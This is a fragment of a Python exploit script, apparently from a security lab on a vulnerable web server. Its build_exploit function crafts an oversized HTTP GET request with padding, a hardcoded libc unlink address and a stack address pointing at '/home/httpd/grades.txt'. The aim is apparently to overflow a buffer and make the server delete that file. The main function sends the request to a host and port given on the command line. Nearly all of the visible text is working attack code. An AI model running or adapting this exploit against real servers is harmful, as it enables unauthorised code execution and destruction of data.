...
def build_exploit(shellcode):
    ...
    special_string = b'/home/httpd/grades.txt'
    unlink = 0x40102450
    special_string_addr = 0xbfffdea9
    long_url = b'1' * (1008) + struct.pack('<I', unlink)

    body_content = b'1' * 1039 + b'aaaa' + struct.pack('<I', unlink) + b'bbbb' + struct.pack('<I', special_string_addr) + b'dank'
    print(struct.pack('<I', special_string_addr))
    req = b'GET /' + b'1'*50 + special_string + b'?asdf HTTP/1.0\r\n' + body_content + b': aaaa\r\n'
    return req
...
def main():
    ...
    try:
        ...
        send_req(sys.argv[1], int(sys.argv[2]), req)
    except:
        print('Exception:')
        traceback.print_exc()
